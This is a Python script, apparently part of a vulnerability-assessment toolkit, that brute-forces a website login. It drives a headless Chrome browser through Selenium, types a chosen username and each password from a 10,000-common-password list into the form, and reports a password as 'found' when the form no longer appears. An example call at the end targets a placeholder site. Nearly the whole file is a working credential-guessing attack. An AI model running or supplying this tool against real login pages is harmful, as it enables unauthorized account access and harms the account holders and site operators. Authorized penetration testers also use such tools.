#!/usr/bin/python3

import os
import requests
from requests import get

import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys

from core.colors import red, green, good, bad, res, white, yellow

vapt_path = os.environ['PYTHONPATH'].split(os.pathsep)
project_root = os.path.abspath(vapt_path[0])
pass_wordlist = os.path.join(project_root, "db", "10k-most-common.txt")


def crack(url, username, user_sel, pass_sel, pass_list):
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument("--disable-popup-blocking")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--log-level=2")

    try:
        resp = get(url)
        if resp.status_code == 200:
            print(f"{good} Website Ok")
        else:
            print(f"{bad} Error accessing website {resp}")
    except (requests.exceptions.MissingSchema, requests.ConnectTimeout) as e:
        print(f"{bad} {e}")

    try:
        with open(pass_list, 'r') as f:
            # Start the browser
            browser = webdriver.Chrome(options=chrome_options)
            browser.implicitly_wait(2)

            browser.get(url)

            try:
                browser.find_element(By.CSS_SELECTOR, value=user_sel)
            except selenium.common.exceptions.NoSuchElementException:
                print(f'{bad}\nUsername field selector is invalid.')
                exit(1)

            try:
                browser.find_element(By.CSS_SELECTOR, value=pass_sel)
            except selenium.common.exceptions.NoSuchElementException:
                print(f'{bad} \nPassword field selector is invalid.')
                exit(1)

            print(f'\n{green}Target user: {red}{username}{white}\n')

            # Start the attack
            try:
                for password in f:
                    password = password.strip()
                    browser.get(url)
                    browser.find_element(By.CSS_SELECTOR, value=user_sel).send_keys(username)
                    browser.find_element(By.CSS_SELECTOR, value=pass_sel).send_keys(password + Keys.ENTER)
                    tried = password
                    print(f"{green} Tried:{white} {tried}")

                print(f"{bad} Sorry, password could not be found")
            except KeyboardInterrupt:
                print(f"{bad} Process terminated by user. Exiting...")
                exit(0)
            except selenium.common.exceptions.NoSuchElementException:
                print(f"{res} Password Found {yellow} {tried}")
                exit(0)
    except FileNotFoundError:
        print(f"\n\t{bad} Password list not found!\n\tPlease provide a valid password list")


# Example usage
crack("https://example.com", "example_user", "username_selector", "password_selector", pass_wordlist)
